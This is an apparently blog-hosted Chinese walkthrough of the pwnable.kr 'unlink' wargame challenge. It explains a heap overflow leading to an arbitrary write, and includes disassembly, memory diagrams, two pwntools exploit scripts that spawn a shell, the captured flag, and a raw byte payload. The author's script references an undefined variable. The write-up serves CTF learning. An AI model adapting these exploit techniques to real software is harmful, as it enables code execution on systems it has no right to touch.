@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="pwnable.kr 中简单的堆溢出利用。 堆溢出的原理：用精心构造的数据去溢出下一个堆块的块首，改写堆块的前向指针和后向指针，然后再分配、释放、合并等操作发生时伺机获取一次向内存任意地址写入任意数据的机会。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/08/14/unlink/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="pwnable.kr 中简单的堆溢出利用。 堆溢出的原理：用精心构造的数据去溢出下一个堆块的块首，改写堆块的前向指针和后向指针，然后再分配、释放、合并等操作发生时伺机获取一次向内存任意地址写入任意数据的机会。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-08-14T13:17:15.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.905Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/08/14/unlink/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2017/08/14/unlink/","path":"2017/08/14/unlink/","title":"unlink"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>unlink | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ps%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">PS，没有成功的方法：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number"></span> <span class="nav-text">参考资料</span></a></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/08/14/unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="unlink | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          unlink
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-08-14 21:17:15" itemprop="dateCreated datePublished" datetime="2017-08-14T21:17:15+08:00">2017-08-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwnable-kr/" itemprop="url" rel="index"><span itemprop="name">pwnable.kr</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>pwnable.kr 中简单的堆溢出利用。
+堆溢出的原理：用精心构造的数据去溢出下一个堆块的块首，改写堆块的前向指针和后向指针，然后再分配、释放、合并等操作发生时伺机获取一次向内存任意地址写入任意数据的机会。</p>
+<span id="more"></span>
+<p>连接服务器。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure> 查看文件，发现源码和可执行文件。
+运行可执行文件，我们获得了堆、栈地址。</p>
+<p>查看可执行文件<code>unlink</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unlink@ubuntu:~$ checksec unlink</span><br><span class="line">[*] &#x27;/home/unlink/unlink&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line"></span><br></pre></td></tr></table></figure> 开启了NX保护。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">        struct tagOBJ* fd;</span><br><span class="line">        struct tagOBJ* bk;</span><br><span class="line">        char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK=P-&gt;bk;</span><br><span class="line">        FD=P-&gt;fd;</span><br><span class="line">        FD-&gt;bk=BK;</span><br><span class="line">        BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">        malloc(1024);</span><br><span class="line">        OBJ* A = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* B = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* C = (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">        // double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">        A-&gt;fd = B;</span><br><span class="line">        A-&gt;fd = B;</span><br><span class="line">        B-&gt;bk = A;</span><br><span class="line">        B-&gt;fd = C;</span><br><span class="line">        C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">        printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">        printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">        printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">        // heap overflow!</span><br><span class="line">        gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        // exploit this unlink!</span><br><span class="line">        unlink(B);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>查看源码，可以发现，给A赋值时使用了<code>gets</code>函数，存在溢出B堆和C堆的可能，并在gets函数后调用了<code>unlink(B)</code>，而<code>unlink()</code>函数模拟了堆溢出后<code>free</code>造成的任意地址写操作，即0day安全中提到的<code>DWROD SHOOT</code>，存在unlink漏洞。并且源程序给出了shell函数，此函数地址可以作为shellcode的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure>
+<p>shell函数的地址：<code>0x080484eb</code>。</p>
+<p>unlink(B)完成的操作为：</p>
+<pre><code>B-&gt;fd-&gt;bk = B-&gt;bk
+B-&gt;bk-&gt;fd = B-&gt;fd</code></pre>
+<p>如果要利用unlink来覆盖返回地址，则堆B在内存中的布局应该是这样的</p>
+<pre><code>+-------------------+-------------------+
+|stack[return addr] |     addr shell    |
++-------------------+-------------------+
+|               padding                 |
++---------------------------------------+</code></pre>
+<p>如果这么构造，这里有问题。 -
+shell函数的地址在代码段，代码段是没有写权限的，所以在执行<code>B-&gt;bk-&gt;fd = B-&gt;fd</code>会报错。所以<code>B-&gt;fd</code>,<code>B-&gt;bk</code>必须指向可读可写的内存。
+所以必须两个地址都要可写。 查看汇编代码，main中存在这么几行代码：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x080485f2 &lt;+195&gt;:	call   0x8048504 &lt;unlink&gt;</span><br><span class="line">0x080485f7 &lt;+200&gt;:	add    $0x10,%esp</span><br><span class="line">0x080485fa &lt;+203&gt;:	mov    $0x0,%eax</span><br><span class="line">0x080485ff &lt;+208&gt;:	mov    -0x4(%ebp),%ecx</span><br><span class="line">0x08048602 &lt;+211&gt;:	leave  </span><br><span class="line">0x08048603 &lt;+212&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">0x08048606 &lt;+215&gt;:	ret  </span><br></pre></td></tr></table></figure> leave在32位汇编下相当于 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp                                            </span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure> 整合一下就是
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov    -0x4(%ebp),%ecx</span><br><span class="line">mov 	  %ebp,%esp</span><br><span class="line">pop    %ebp</span><br><span class="line">lea    -0x4(%ecx),%esp</span><br><span class="line">ret  </span><br></pre></td></tr></table></figure></p>
+<p><code>ret</code>指令的作用是栈顶元素出栈，即<code>%esp</code>，其值赋给<code>%eip</code>寄存器。
+从上面可以逆向分析到,存在以下一个关系：</p>
+<pre><code>%ecx &lt;= %ebp-0x4
+%esp &lt;= %ecx-0x4 </code></pre>
+<p>我们可以将shellcode+0x4地址写入%ebp-0x4中，达到跳转的目的。</p>
+<p>通过逆向可知，&amp;A，&amp;B，&amp;C的地址在栈上，分别为 %ebp-0x14,
+%ebp-0x10, %ebp-0xc。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x08048555 &lt;+38&gt;:	call   0x80483a0 &lt;malloc@plt&gt;</span><br><span class="line">0x0804855a &lt;+43&gt;:	add    $0x10,%esp</span><br><span class="line">0x0804855d &lt;+46&gt;:	mov    %eax,-0x14(%ebp)</span><br><span class="line">0x08048560 &lt;+49&gt;:	sub    $0xc,%esp</span><br><span class="line">0x08048563 &lt;+52&gt;:	push   $0x10</span><br><span class="line">0x08048565 &lt;+54&gt;:	call   0x80483a0 &lt;malloc@plt&gt;</span><br><span class="line">0x0804856a &lt;+59&gt;:	add    $0x10,%esp</span><br><span class="line">0x0804856d &lt;+62&gt;:	mov    %eax,-0xc(%ebp)</span><br><span class="line">0x08048570 &lt;+65&gt;:	sub    $0xc,%esp</span><br><span class="line">0x08048573 &lt;+68&gt;:	push   $0x10</span><br><span class="line">0x08048575 &lt;+70&gt;:	call   0x80483a0 &lt;malloc@plt&gt;</span><br><span class="line">0x0804857a &lt;+75&gt;:	add    $0x10,%esp</span><br><span class="line">0x0804857d &lt;+78&gt;:	mov    %eax,-0x10(%ebp)</span><br><span class="line">0x08048580 &lt;+81&gt;:	mov    -0x14(%ebp),%eax</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+根据运行程序提供的信息，我们能够拿到<code>&amp;A</code>=%ebp-0x14，则可控制的栈地址为%ebp-0x4，可控的栈地址为<code>&amp;A+0x10</code>。</p>
+<p>我们将shellcode的地址写入<code>&amp;A+0x10</code>。</p>
+<p>通过GDB分析，将断点设在<code>0x080485f2 &lt;+195&gt;:   call   0x8048504 &lt;unlink&gt;</code>上，可以观察内存中堆的变化。</p>
+<p>只要能够修改ESP寄存器的内容修改为shellcode的地址就能够执行shellcode。也就是说，利用堆溢出控制栈数据，这里采用unlink的DWORD
+SHOOT技术。</p>
+<p>划出堆中简略布局图。</p>
+<pre><code>+-------------------+-------------------+  &lt;- [A]
+|        FD         |        BK         |
++-------------------+-------------------+  &lt;- [A-&gt;buf]
+|     shellcode     |       AAAA        |
++---------------------------------------+
+|              AAAAAAAA                 |
++---------------------------------------+  &lt;- [B]
+|       fd1         |        bk2        |
++-------------------+-------------------+</code></pre>
+<p>可以利用<code>BK-&gt;fd=FD</code>得到以下布局，</p>
+<pre><code>+-------------------+-------------------+  &lt;- [A]
+|        FD         |        BK         |
++-------------------+-------------------+  &lt;- [A-&gt;buf]
+|     shell addr    |      &#39;aaaa&#39;       |
++---------------------------------------+
+|              &#39;aaaaaaaa&#39;               |
++---------------------------------------+  &lt;- [B]
+|     A + 12        |     &amp;A + 16       |
++-------------------+-------------------+</code></pre>
+<p>或者利用<code>FD-&gt;bk=BK</code>得到以下布局</p>
+<pre><code>+-------------------+-------------------+  &lt;- [A]
+|        FD         |        BK         |
++-------------------+-------------------+  &lt;- [A-&gt;buf]
+|     shell addr    |      &#39;aaaa&#39;       |
++---------------------------------------+
+|              &#39;aaaaaaaa&#39;               |
++---------------------------------------+  &lt;- [B]
+|     &amp;A + 12       |     A + 12        |
++-------------------+-------------------+</code></pre>
+<p>漏洞利用代码 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">#context(log_level=&quot;debug&quot;)</span><br><span class="line">s =  ssh(host=&#x27;pwnable.kr&#x27;,</span><br><span class="line">         port=2222,</span><br><span class="line">         user=&#x27;unlink&#x27;,</span><br><span class="line">         password=&#x27;guest&#x27;</span><br><span class="line">        )</span><br><span class="line">p = s.process(&quot;./unlink&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;here is stack address leak: &quot;)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">p.recvuntil(&quot;here is heap address leak: &quot;)</span><br><span class="line">heap_addr = int(p.recv(9),16)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;now that you have leaks, get shell!\n&quot;)</span><br><span class="line"></span><br><span class="line">shell_func_addr = 0x080484eb</span><br><span class="line">padding = &#x27;A&#x27;*12</span><br><span class="line">#方法一</span><br><span class="line">fdB = heap_addr + 12</span><br><span class="line">bkB = stack_addr + 16</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">#方法二</span><br><span class="line">或者交换位置，但要重新计算偏移值</span><br><span class="line">bkB = heap_addr + 12</span><br><span class="line">fdB = stack_addr + 12</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload = p32(shell_buf) + padding + p32(fdB) + p32(bkB)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>等待连接成功后，顺利拿到shell。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ $ cat flag</span><br><span class="line">conditional_write_what_where_from_unl1nk_explo1t</span><br></pre></td></tr></table></figure>
+目录下，作者也给出了参考答案： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;i386&#x27;   # i386 / arm</span><br><span class="line">r = process([&#x27;/home/unlink/unlink&#x27;])</span><br><span class="line">leak = r.recvuntil(&#x27;shell!\n&#x27;)</span><br><span class="line">stack = int(leak.split(&#x27;leak: 0x&#x27;)[1][:8], 16)</span><br><span class="line">heap = int(leak.split(&#x27;leak: 0x&#x27;)[2][:8], 16)</span><br><span class="line">shell = 0x80484eb</span><br><span class="line">payload = pack(shell)       # heap + 8  (new ret addr)</span><br><span class="line">payload += pack(heap + 12)  # heap + 12 (this -4 becomes ESP at ret)</span><br><span class="line">payload += &#x27;3333&#x27;       # heap + 16</span><br><span class="line">payload += &#x27;4444&#x27;</span><br><span class="line">payload += pack(stack - 0x20)   # eax. (address of old ebp of unlink) -4</span><br><span class="line">payload += pack(heap + 16)  # edx.</span><br><span class="line">r.sendline( payload )</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="ps没有成功的方法">PS，没有成功的方法：</h2>
+<p>打开两个终端，第一个终端利用三个<code>cat</code>命令，等待读取<code>/tmp/payloadsss</code>中数据，
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unlink@ubuntu:~$ (cat -; cat /tmp/payloadsss; cat -) | ./unlink </span><br><span class="line">here is stack address leak: 0xffdfd8e4</span><br><span class="line">here is heap address leak: 0x99c8410</span><br><span class="line">now that you have leaks, get shell!</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure> 第二个终端，将payload写入文件中。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink@ubuntu:~$ python -c &quot;print  &#x27;\xeb\x84\x04\x08&#x27;+&#x27;A&#x27;*12+ &#x27;\x1c\x84\x9c\x09&#x27; + &#x27;\xf4\xd8\xdf\xff&#x27; &quot; &gt; /tmp/payloadsss</span><br></pre></td></tr></table></figure>
+再在第一个终端中，输入<code>ctrl+D</code>。</p>
+<p>-^-很可惜，我没有成功。</p>
+<h1 id="总结">总结：</h1>
+<ol type="1">
+<li>经典的unlink是通过改写got表中的free地址为我们的shellcode的地址，这里也没有用到free函数。</li>
+<li>汇编语言leave是mov esp, ebp pop ebp</li>
+<li>pwntools中的API使用，ssh,process,remote等。</li>
+<li>堆溢出的原理：用精心构造的数据去溢出下一个堆块的块首，改写堆块的前向指针和后向指针，然后再分配、释放、合并等操作发生时司机获取一次向内存任意地址写入任意数据的机会。</li>
+</ol>
+<h1 id="参考资料">参考资料</h1>
+<p>[1] <a target="_blank" rel="noopener" href="https://werew.tk/article/17/unlink-pwnablekr">Unlink -
+Pwnable.kr</a> [2] <a
+target="_blank" rel="noopener" href="http://blog.csdn.net/qq_33528164/article/details/77061932">全面剖析Pwnable.kr
+unlink</a> [3] <a
+target="_blank" rel="noopener" href="https://de4dcr0w.github.io/2017/04/23/pwnable.kr%E4%B9%8Bunlink%E5%88%9D%E6%8E%A2/">pwnable.kr之初探unlink</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/08/13/GDB%E8%B0%83%E8%AF%95/" rel="prev" title="GDB调试">
+                  <i class="fa fa-angle-left"></i> GDB调试
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/08/20/passcode/" rel="next" title="passcode">
+                  passcode <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
